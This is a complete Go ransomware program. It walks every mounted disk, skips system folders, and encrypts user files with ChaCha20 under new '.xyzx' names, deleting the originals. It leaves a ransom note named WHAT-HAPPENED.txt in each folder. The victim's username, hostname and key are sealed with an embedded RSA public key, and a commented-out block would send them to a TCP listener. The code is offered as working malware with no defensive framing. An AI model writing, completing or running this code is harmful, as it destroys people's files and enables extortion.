package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	_ "embed"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shirou/gopsutil/disk"
	"golang.org/x/crypto/chacha20"
)

//go:embed download.dat
var downloadedFile []byte

//go:embed keys/public_key.pem
var publicKeyPEM []byte

var blacklistDirs []string
var blacklistExtensions = []string{
	".386", ".adv", ".ani", ".bat", ".bin", ".cab", ".cmd", ".com", ".cpl", ".cur", ".deskthemepack", ".diagcab", ".diagcfg", ".diagpkg", ".dll", ".drv", ".exe", ".hlp", ".icl", ".icns", ".ico", ".ics", ".idx", ".ldf", ".lnk", ".mod", ".mpa", ".msc", ".msp", ".msstyles", ".msu", ".nls", ".nomedia", ".ocx", ".prf", ".ps1", ".rom", ".rtp", ".scr", ".shs", ".spl", ".sys", ".theme", ".themepack", ".wpx", ".lock", ".key", ".hta", ".msi", ".pdb",
}

func init() {
	if runtime.GOOS == "windows" {
		blacklistDirs = []string{
			"appdata", "application data", "boot", "google", "mozilla", "program files", "program files (x86)", "programdata", "system volume information", "tor browser", "windows.old", "intel", "msocache", "perflogs", "x64dbg", "public", "all users", "default", "$recycle.bin", "config.msi", "$windows.~bt", "$windows.~ws", "steam", "steamapps", "windows", "temp", "$winreagent",
		}
	} else {
		blacklistDirs = []string{
			"boot", "bin", "dev", "dev/", "/dev/console","/dev", "etc", "lib", "proc", "sys", "usr/bin", "usr/lib", "usr/sbin", "usr/share", "var", "run", "tmp","/sys", "sys/", "/sys/", "/proc",

		}
	}
}
func Chacha20Worker(input []byte, key []byte) []byte {

	cipher, _ := chacha20.NewUnauthenticatedCipher(key, make([]byte, chacha20.NonceSize))
	encryptedData := make([]byte, len(input))
	cipher.XORKeyStream(encryptedData, input)

	return encryptedData
}

func encryptFile(filePath string, key []byte, verbose ...bool) error {
	fileContent, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}
	encryptedData := Chacha20Worker(fileContent, key)

	outputFile := strings.TrimSuffix(filePath, filepath.Ext(filePath)) + strings.ToLower(filepath.Ext(filePath)) + ".xyzx"
	err = os.WriteFile(outputFile, encryptedData, 0644)
	if err != nil {
		return err
	}

	err = os.Remove(filePath)
	if err != nil {
		return err
	}

	return nil
}

func diskhd() ([]string, error) {
  partitions, err := disk.Partitions(true)
  if err != nil {
    return nil, err
  }

  var mountPoints []string
  seen := make(map[string]struct{}) // Use a map to efficiently track seen partitions

  for _, partition := range partitions {
    if _, ok := seen[partition.Mountpoint]; ok {
      continue // Skip if partition mountpoint has already been seen
    }

    seen[partition.Mountpoint] = struct{}{} // Mark partition mountpoint as seen

    isBlacklisted := false
    for _, excludedDir := range blacklistDirs {
      if strings.Contains(partition.Mountpoint, excludedDir) {
        isBlacklisted = true
        break // Exit the loop once a match is found
      }
    }

    if !isBlacklisted {
      //fmt.Println(partition.Mountpoint, "kkkk")
      mountPoints = append(mountPoints, partition.Mountpoint)
    } else {
      //fmt.Println("fodasekkk", partition.Mountpoint)
    }
  }
  //print(mountPoints)
  return mountPoints, nil
}
func encryptFilesInFolder(folderPath string, key []byte, b string) error {
	files, err := os.ReadDir(folderPath)
	w := AesDecrypter(downloadedFile, []byte("1231231231231231"), []byte("1231231231231231"))
	if err != nil {
		return err
	}
	doneChan := make(chan struct{})
	errChan := make(chan error)
	go func() {
		defer close(doneChan)
		for _, file := range files {
			filePath := filepath.Join(folderPath, file.Name())
			if file.IsDir() {
				skipFolder := false
				for _, excludedDir := range blacklistDirs {
					folderName := filepath.Base(folderPath)
          //fmt.Println(filePath)
					if strings.ToLower(folderName) == excludedDir && strings.Contains(strings.ToLower(folderPath), excludedDir) && runtime.GOOS == "windows" || strings.Contains(filePath, excludedDir)  {
            fmt.Println("[+] Skipping", filePath)
						skipFolder = true
						break
					}
        }

				if skipFolder {
					continue
				}

				encryptFilesInFolder(filePath, key, b)

			} else {

				txtFilePath := filepath.Join(folderPath, "WHAT-HAPPENED.txt")
				file, _ := os.Create(txtFilePath)
				defer file.Close()
				_, _ = file.WriteString(string(w) + "\n" + b)
				ext := strings.ToLower(filepath.Ext(filePath))
				for _, excludedExt := range blacklistExtensions {
					if ext == excludedExt {
						fmt.Println("[+] find! ", folderPath, ext)
						continue

					}
				}
				encryptFile(filePath, key)
			}
		}
	}()
	select {
	case <-doneChan:
		return nil
	case err := <-errChan:
		return err
	}
}

func main() {
	key := make([]byte, 32)
	rand.Read(key)
	if os.Geteuid() == 0 {
		fmt.Println("[!] You running as a root, that may can be corrupt some critical files.")
	} else {
		currentUser, _ := user.Current()
		fmt.Println("[-] You running as a " + currentUser.Username + ", might some files you think are interesting can be hidden or not encrypted.")
	}
	var mountPoints []string

	mountPoints, _ = diskhd()
	fmt.Println(mountPoints)
  block, _ := pem.Decode(publicKeyPEM)
	publicKey, _ := x509.ParsePKIXPublicKey(block.Bytes)
	rsaPublicKey, _ := publicKey.(*rsa.PublicKey)

	response, _ := rsa.EncryptPKCS1v15(rand.Reader, rsaPublicKey, []byte("The machine ID: "+func() string { currentUser, _ := user.Current(); return currentUser.Username }()+" @"+func() string { hostName, _ := os.Hostname(); return hostName }()+"\n Your Key is: \n"+hex.EncodeToString(key)))
	/*
		conn, _ := net.Dial("tcp", "127.0.0.1:1337")
		defer conn.Close()
		encoder := gob.NewEncoder(conn)
		encoder.Encode(response)
	*/
	b64 := base64.RawStdEncoding.EncodeToString(response)
	if runtime.GOOS == "windows" {
		for _, rootDir := range mountPoints {
			encryptFilesInFolder(rootDir, key, b64)
		}
  } else {
    for _, rootDir := range mountPoints {
		encryptFilesInFolder(rootDir, key, b64)
	}
  }
	fmt.Println("Encryption completed successfully.")
}

func AesDecrypter(response []byte, key []byte, iv []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if len(response)%block.BlockSize() != 0 {
		panic("Invalid response length")
	}

	decrypted := make([]byte, len(response))

	cbc := cipher.NewCBCDecrypter(block, iv)
	cbc.CryptBlocks(decrypted, response)

	return decrypted
}
